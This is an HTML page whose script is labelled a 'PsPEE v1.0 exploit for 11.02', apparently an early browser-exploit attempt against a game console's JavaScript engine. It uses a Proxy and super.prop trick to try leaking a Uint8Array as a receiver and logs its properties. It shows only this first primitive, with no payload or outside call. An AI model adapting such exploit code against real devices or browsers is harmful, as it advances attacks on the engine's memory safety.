<!DOCTYPE html>
<html>
<head>
    <style>
        #output {
            font-family: monospace;
            white-space: pre-wrap;
            background-color: #333;
            color: #00FF00;
            padding: 10px;
            border-radius: 5px;
            margin-top: 20px;
            width: 100%;
            height: 200px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div id="output"></div>
    <script>
        // Function to log to the div
        function logToDiv(message) {
            const outputDiv = document.getElementById('output');
            outputDiv.textContent += message + '\n';
        }

        logToDiv("[INFO] PsPEE v1.0 exploit for 11.02.");

        // Exploit 1: Leak a JS object via Proxy + super.prop
        function leakJSScope(obj) {
            class Leaker extends Object {
                leak() {
                    return super.foo;
                }
            }

            Leaker.prototype.__proto__ = new Proxy({}, {
                get(target, prop, receiver) {
                    // Instead of receiver.toString(), show constructor and byteLength
                    logToDiv("[Leak] Receiver.constructor → " + receiver.constructor.name);
                    if ('byteLength' in receiver) {
                        logToDiv("[Leak] Receiver.byteLength → " + receiver.byteLength);
                    }
                    return 1;
                }
            });

            const foo = 42;
            const { leak } = Leaker.prototype;
            leak.call(obj);
        }

        // Start the exploit on a TypedArray
        window.onload = function() {
            logToDiv("[*] Attempting to leak a Uint8Array as `this`…");
            leakJSScope(new Uint8Array(16));
        };
    </script>
</body>
</html>
